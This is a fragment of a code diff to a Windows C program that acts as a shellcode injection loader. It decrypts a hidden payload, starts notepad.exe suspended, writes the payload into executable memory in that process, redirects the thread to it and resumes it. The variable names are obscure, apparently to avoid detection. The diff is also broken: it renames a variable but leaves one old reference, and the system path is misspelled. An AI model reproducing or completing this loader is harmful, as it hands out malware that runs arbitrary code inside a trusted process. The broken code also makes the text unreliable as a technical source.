@@ -34,27 +34,27 @@ int main() {
     youareawsomeenc(codfhu, codfhuLen, (unsigned char*)dank1e6ENC, dank1e6ENCLen);
 
     STARTUPINFO si = {0};
-    PROCESS_INFORMATION procin = {0};
+    PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
 
-    CreateProcess("C:\\Windows\\systme32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &procin);
+    CreateProcess("C:\\Windows\\systme32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
       
 
     
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
 
-    GetThreadContext(procin.hThread, &ctx);
+    GetThreadContext(pi.hThread, &ctx);
 
-    LPVOID dankummm = VirtualAllocEx(procin.hProcess, NULL, codfhuLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID dankummm = VirtualAllocEx(pi.hProcess, NULL, codfhuLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     
 
-    WriteProcessMemory(procin.hProcess, dankummm, codfhu, codfhuLen, NULL);
+    WriteProcessMemory(pi.hProcess, dankummm, codfhu, codfhuLen, NULL);
     // Update entry point
     ctx.Rcx = (DWORD64)dankummm; 
-    SetThreadContext(procin.hThread, &ctx);
+    SetThreadContext(pi.hThread, &ctx);
 
-    ResumeThread(procin.hThread); 
+    ResumeThread(pi.hThread); 
 
     
     CloseHandle(procin.hThread);
